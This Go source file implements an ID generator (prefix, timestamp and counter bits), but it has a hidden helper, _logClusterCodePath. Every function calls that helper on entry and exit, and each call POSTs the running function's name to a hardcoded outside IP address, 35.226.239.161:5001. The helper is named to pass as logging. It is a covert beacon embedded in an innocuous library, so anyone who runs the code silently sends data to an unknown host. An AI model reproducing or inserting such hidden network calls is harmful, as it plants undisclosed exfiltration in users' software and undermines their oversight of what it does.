package idutil

import (
	"math"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"sync/atomic"
	"time"
)

const (
	tsLen		= 5 * 8
	cntLen		= 8
	suffixLen	= tsLen + cntLen
)

type Generator struct {
	prefix	uint64
	suffix	uint64
}

func NewGenerator(memberID uint16, now time.Time) *Generator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	prefix := uint64(memberID) << suffixLen
	unixMilli := uint64(now.UnixNano()) / uint64(time.Millisecond/time.Nanosecond)
	suffix := lowbit(unixMilli, tsLen) << cntLen
	return &Generator{prefix: prefix, suffix: suffix}
}
func (g *Generator) Next() uint64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	suffix := atomic.AddUint64(&g.suffix, 1)
	id := g.prefix | lowbit(suffix, suffixLen)
	return id
}
func lowbit(x uint64, n uint) uint64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return x & (math.MaxUint64 >> (64 - n))
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
